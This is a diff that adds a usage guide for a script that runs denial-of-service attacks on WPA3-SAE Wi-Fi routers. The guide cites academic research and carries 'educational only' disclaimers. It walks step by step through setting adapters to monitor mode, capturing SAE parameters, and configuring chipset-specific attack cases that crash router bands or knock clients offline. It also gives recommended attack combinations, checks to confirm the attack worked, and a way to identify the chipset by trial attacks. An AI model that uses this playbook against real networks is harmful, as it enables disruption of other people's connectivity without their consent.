@@ -1,0 +1,467 @@
+# USAGE GUIDE: orchestator_master_en.py
+
+**DISCLAIMER:** This script is intended for EDUCATIONAL PURPOSES ONLY and for authorized security testing on networks you own or have explicit permission to test. Unauthorized use is illegal.
+
+## OVERVIEW
+This is the comprehensive attack script containing ALL 26 attack types including vendor-specific exploits (Cases 1-13) targeting Broadcom, Qualcomm, and MediaTek chipsets. Use this script when you need maximum attack variety or chipset-specific exploits.
+
+---
+
+## IDENTIFYING YOUR TARGET ROUTER'S CHIPSET
+
+**CRITICAL:** Cases 1-13 are vendor-specific attacks. Before using them, you MUST identify which chipset your target router uses.
+
+### Method 1: Router Documentation
+Check the router's official specifications:
+- Visit the manufacturer's website
+- Look for "chipset", "processor", or "SoC" specifications
+- Common examples:
+  - Broadcom BCM4908, BCM63xx series
+  - Qualcomm IPQ40xx, IPQ80xx series
+  - MediaTek MT7621, MT7986 series
+
+### Method 2: OpenWrt/DD-WRT Database
+```bash
+# Search online databases:
+https://openwrt.org/toh/start
+https://wiki.dd-wrt.com/wiki/index.php/Supported_Devices
+```
+Search for your router model to find chipset information.
+
+### Method 3: Router Admin Panel
+Some routers display chipset info in:
+- System Information page
+- About section
+- Hardware version details
+
+### Method 4: FCC Database
+```
+https://fccid.io/
+```
+Search your router's FCC ID (usually on the device label) for internal photos showing chipsets.
+
+### Method 5: Using Attached Reference File
+Check the file "Broadcom-Qualcomm-Mediatek-chipset-find-out.txt" for detailed methods including:
+- Nmap service detection
+- Banner grabbing techniques
+- Known router model databases
+
+---
+
+## CHIPSET-SPECIFIC ATTACK MAPPING
+
+**Broadcom Chipsets (Cases 1-7):**
+- `case1_denial_of_internet`: Session deletion attack
+- `case2_bad_auth_algo_broadcom`: Invalid algorithm exploit
+- `case3_bad_status_code`: Status code manipulation
+- `case4_bad_send_confirm`: Send-Confirm counter abuse
+- `case5_empty_frame`: Empty SAE confirm frames
+- `case6_radio_confusion`: Dual-band confusion (crashes 5 GHz)
+- `case6_radio_confusion_reverse`: Reverse confusion (crashes 2.4 GHz)
+- `case7_back_to_the_future`: WPA3 packets to WPA2 AP
+
+**Qualcomm Chipsets (Cases 8-11):**
+- `case8_bad_auth_algo_qualcomm`: Qualcomm algo exploit
+- `case9_bad_sequence_number`: Invalid sequence numbers
+- `case10a_bad_auth_body_empty`: Empty auth body
+- `case10b_bad_auth_body_payload`: Malformed auth payload
+- `case11_seq_status_fuzz`: Fuzzing attack
+
+**MediaTek Chipsets (Cases 12-13):**
+- `case12_bursty_auth`: Burst reboot attack
+- `case13_radio_confusion_mediatek`: Confusion (crashes 2.4 GHz)
+- `case13_radio_confusion_mediatek_reverse`: Reverse (crashes 5 GHz)
+
+---
+
+## PREREQUISITES
+
+### Required Hardware
+- Multiple Wi-Fi adapters with monitor mode and injection support
+- Scanner adapter (optional but recommended)
+- Attack adapters for each simultaneous attack
+
+### Required Software
+- Linux OS (Kali Linux recommended)
+- Python 3.x
+- Scapy: `pip3 install scapy`
+- Aircrack-ng: `apt-get install aircrack-ng`
+- Wireshark: `apt-get install wireshark`
+- iw tools: `apt-get install iw`
+
+---
+
+## STEP-BY-STEP USAGE INSTRUCTIONS
+
+### STEP 1: SET ADAPTERS TO MONITOR MODE
+
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airmon-ng start wlan1
+sudo airmon-ng start wlan2
+sudo airmon-ng start wlan3
+# Continue for all adapters
+```
+
+Verify:
+```bash
+iwconfig
+```
+
+---
+
+### STEP 2: SCAN FOR TARGETS
+
+**Identify Target Network:**
+```bash
+sudo airodump-ng wlan0mon --band abg
+```
+
+Note down:
+- Target BSSID (5 GHz and 2.4 GHz)
+- Channel numbers
+- Connected client MAC addresses
+- Press `Ctrl+C` when done
+
+---
+
+### STEP 3: EXTRACT SAE PARAMETERS
+
+**For WPA3 attacks (Cases involving SAE), you MUST extract these values:**
+
+#### 3.1: Capture SAE Handshake
+```bash
+sudo wireshark
+```
+- Select monitor interface
+- Start capture
+- Connect a device with WRONG password to trigger SAE
+- Stop capture after connection attempt
+
+#### 3.2: Filter SAE Packets
+Display filter:
+```
+wlan.fc.type_subtype == 0x0b
+```
+
+#### 3.3: Extract Values
+Find Authentication frame → IEEE 802.11 → Tagged Parameters → SAE:
+- Right-click "Scalar" → Copy → Value
+- Right-click "Finite Field Element" → Copy → Value
+
+---
+
+### STEP 4: CONFIGURE THE SCRIPT
+
+Open script:
+```bash
+nano orchestator_master_en.py
+```
+
+#### 4.1: Set Target BSSIDs
+```python
+TARGET_BSSID_5GHZ = "64:67:72:81:9C:6E"
+TARGET_BSSID_2_4GHZ = "64:67:72:81:9C:6D"
+```
+
+#### 4.2: Configure Scanner
+```python
+SCANNER_INTERFACE = "wlan0mon"  # Or "" to disable
+```
+
+#### 4.3: Manual Channels (if no scanner)
+```python
+MANUELLER_KANAL_5GHZ = "36"
+MANUELLER_KANAL_2_4GHZ = "1"
+```
+
+#### 4.4: Define Target Clients
+```python
+TARGET_STA_MACS = [
+    "30:34:DB:11:48:09",
+    "06:B2:AA:AC:5D:31"
+]
+```
+
+#### 4.5: **IMPORTANT: Set Band-Specific Client Lists**
+
+**For Radio Confusion Attacks (Cases 6 & 13):**
+
+```python
+# GROUP A: Clients currently on 5 GHz (to crash 5 GHz band)
+TARGET_STA_MACS_5GHZ_SPECIAL = [
+    "4E:17:88:DD:E6:83",  # Must be connected to 5 GHz band
+    "56:01:B3:1E:8C:08"
+]
+
+# GROUP B: Clients currently on 2.4 GHz (to crash 2.4 GHz band)
+TARGET_STA_MACS_2_4GHZ_SPECIAL = [
+    "30:34:DB:11:48:09"   # Must be connected to 2.4 GHz band
+]
+```
+
+**Critical Understanding:**
+- `case6_radio_confusion` (standard): Attacks FROM 2.4 GHz band → CRASHES 5 GHz band
+- `case6_radio_confusion_reverse`: Attacks FROM 5 GHz band → CRASHES 2.4 GHz band
+- `case13_radio_confusion_mediatek`: Attacks FROM 5 GHz → CRASHES 2.4 GHz
+- `case13_radio_confusion_mediatek_reverse`: Attacks FROM 2.4 GHz → CRASHES 5 GHz
+
+#### 4.6: Paste SAE Parameters
+```python
+SAE_SCALAR_HEX = 'YOUR_EXTRACTED_SCALAR_HERE'
+SAE_FINITE_ELEMENT_HEX = 'YOUR_EXTRACTED_FINITE_ELEMENT_HERE'
+```
+
+#### 4.7: Configure Attack Adapters
+
+**Example for Broadcom Router:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "case1_denial_of_internet"},
+    "wlan2mon": {"band": "5GHz", "angriff": "case2_bad_auth_algo_broadcom"},
+    "wlan3mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"}
+}
+```
+
+**Example for Qualcomm Router:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "case8_bad_auth_algo_qualcomm"},
+    "wlan2mon": {"band": "5GHz", "angriff": "case9_bad_sequence_number"},
+    "wlan3mon": {"band": "2.4GHz", "angriff": "case11_seq_status_fuzz"}
+}
+```
+
+**Example for MediaTek Router:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "case12_bursty_auth"},
+    "wlan2mon": {"band": "2.4GHz", "angriff": "case13_radio_confusion_mediatek"}
+}
+```
+
+---
+
+### STEP 5: RUN THE SCRIPT
+
+Start the attack:
+```bash
+sudo python3 orchestator_master_en.py
+```
+
+**Expected behavior:**
+1. Interface initialization
+2. Scanner searches for targets (if enabled)
+3. Attack processes launch on configured adapters
+4. Real-time packet counters display
+
+**To stop:** Press `Ctrl+C`
+
+---
+
+## VERIFYING ATTACK SUCCESS
+
+### For AP Overload Attacks (Cases 1-5, 8-12)
+
+Monitor beacon jitter:
+```bash
+sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 64:67:72:81:9C:6E" -T fields -e frame.time_delta_displayed
+```
+
+**Success:** Values >> 0.1024 (e.g., 0.5, 1.0, 2.0+)
+
+### For Radio Confusion Attacks (Cases 6, 13)
+
+**To verify 5 GHz band crash:**
+```bash
+sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 64:67:72:81:9C:6E"
+```
+**Success:** No beacons received, or extremely irregular intervals
+
+**To verify 2.4 GHz band crash:**
+```bash
+sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 64:67:72:81:9C:6D"
+```
+
+### For Client Attacks
+
+Monitor client disconnections:
+```bash
+sudo tshark -i wlan0mon -Y "wlan.addr == 30:34:DB:11:48:09 && wlan.fc.type_subtype == 0x0c"
+```
+
+**Success:** Stream of deauth frames, client offline
+
+---
+
+## ATTACK STRATEGY BY CHIPSET
+
+### Broadcom Routers:
+**Recommended Combination:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "case2_bad_auth_algo_broadcom"},
+    "wlan2mon": {"band": "5GHz", "angriff": "case7_back_to_the_future"},
+    "wlan3mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"},  # Crashes 5G
+    "wlan4mon": {"band": "2.4GHz", "angriff": "case1_denial_of_internet"}
+}
+```
+
+### Qualcomm Routers:
+**Recommended Combination:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "case8_bad_auth_algo_qualcomm"},
+    "wlan2mon": {"band": "5GHz", "angriff": "case10b_bad_auth_body_payload"},
+    "wlan3mon": {"band": "2.4GHz", "angriff": "case9_bad_sequence_number"},
+    "wlan4mon": {"band": "2.4GHz", "angriff": "case11_seq_status_fuzz"}
+}
+```
+
+### MediaTek Routers:
+**Recommended Combination:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "case12_bursty_auth"},
+    "wlan2mon": {"band": "5GHz", "angriff": "case13_radio_confusion_mediatek"},  # Crashes 2.4G
+    "wlan3mon": {"band": "2.4GHz", "angriff": "case13_radio_confusion_mediatek_reverse"}  # Crashes 5G
+}
+```
+
+### Unknown Chipset:
+Use universal attacks from `orchestator_final_mit_allen_details_en.py` instead.
+
+---
+
+## SPECIAL ATTACK NOTES
+
+### Case 6 & 13 (Radio Confusion) - CRITICAL SETUP
+
+These attacks exploit dual-band routers by sending packets from one band that confuse the other band's driver.
+
+**Setup Rules:**
+
+**To crash 5 GHz band:**
+- Adapter must be on 2.4 GHz band
+- Use: `case6_radio_confusion` OR `case13_radio_confusion_mediatek_reverse`
+- Requires clients from `TARGET_STA_MACS_5GHZ_SPECIAL`
+
+**To crash 2.4 GHz band:**
+- Adapter must be on 5 GHz band
+- Use: `case6_radio_confusion_reverse` OR `case13_radio_confusion_mediatek`
+- Requires clients from `TARGET_STA_MACS_2_4GHZ_SPECIAL`
+
+**Example configuration:**
+```python
+# Goal: Crash the 5 GHz band
+ADAPTER_KONFIGURATION = {
+    "wlan3mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"}
+}
+TARGET_STA_MACS_5GHZ_SPECIAL = ["4E:17:88:DD:E6:83"]  # Client on 5 GHz
+```
+
+### Case 11 (Fuzzing) - Time-Intensive
+This attack cycles through sequence/status combinations. Takes 1000+ iterations per cycle. Be patient.
+
+### Case 7 (Back to the Future)
+Only works on WPA2 APs. Uses WPA3 SAE parameters to overflow WPA2 AP memory.
+
+---
+
+## TROUBLESHOOTING
+
+### "Could not initialize interface"
+```bash
+sudo ip link set wlan1mon down
+sudo iw wlan1mon set monitor control
+sudo ip link set wlan1mon up
+```
+
+### "Channel switch failed"
+- Verify adapter supports target frequency
+- Some adapters are 2.4 GHz only
+- Check with: `iw list`
+
+### Radio Confusion attacks not working
+- Verify you're using correct client MAC list (5GHz_SPECIAL vs 2_4GHZ_SPECIAL)
+- Confirm clients are actually connected to specified band
+- Check adapter is on opposite band from target crash band
+
+### "No clients" warnings
+- Scanner must be active to auto-detect client bands
+- Or manually verify which band clients are on
+- Use airodump-ng to see client associations
+
+### Script exits immediately
+- Run with sudo
+- Check Python3 and Scapy installed
+- Verify all interfaces exist and are in monitor mode
+
+---
+
+## ADVANCED TIPS
+
+### Combining Universal + Vendor Attacks
+For maximum effectiveness, mix vendor-specific with universal attacks:
+
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "case2_bad_auth_algo_broadcom"},  # Vendor
+    "wlan2mon": {"band": "5GHz", "angriff": "open_auth"},                     # Universal
+    "wlan3mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"},       # Vendor
+    "wlan4mon": {"band": "2.4GHz", "angriff": "amplification"}                # Universal
+}
+```
+
+### Testing Chipset Identification
+If unsure of chipset, test one attack from each vendor:
+1. Run `case2_bad_auth_algo_broadcom` → Monitor beacon jitter
+2. If no effect, try `case8_bad_auth_algo_qualcomm`
+3. If no effect, try `case12_bursty_auth`
+
+Whichever causes highest jitter = correct chipset.
+
+---
+
+## STARTING THE SCRIPT
+
+**Standard execution:**
+```bash
+sudo python3 orchestator_master_en.py
+```
+
+**With output logging:**
+```bash
+sudo python3 orchestator_master_en.py 2>&1 | tee attack_log.txt
+```
+
+**In background (screen session):**
+```bash
+sudo screen -S wifi_attack
+sudo python3 orchestator_master_en.py
+# Press Ctrl+A, then D to detach
+# Reattach with: sudo screen -r wifi_attack
+```
+
+---
+
+## LEGAL AND ETHICAL DISCLAIMER
+
+- **EDUCATIONAL PURPOSES ONLY**
+- Only test on networks YOU OWN
+- Unauthorized testing is ILLEGAL and punishable by law
+- Obtain written permission for security testing
+- Do not disrupt critical infrastructure
+- Responsible disclosure of vulnerabilities
+
+**You are solely responsible for your actions.**
+
+---
+
+## REFERENCES
+
+Based on research: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
+Journal of Information Security and Applications (2022)
+
+For chipset identification methods, see: "Broadcom-Qualcomm-Mediatek-chipset-find-out.txt"
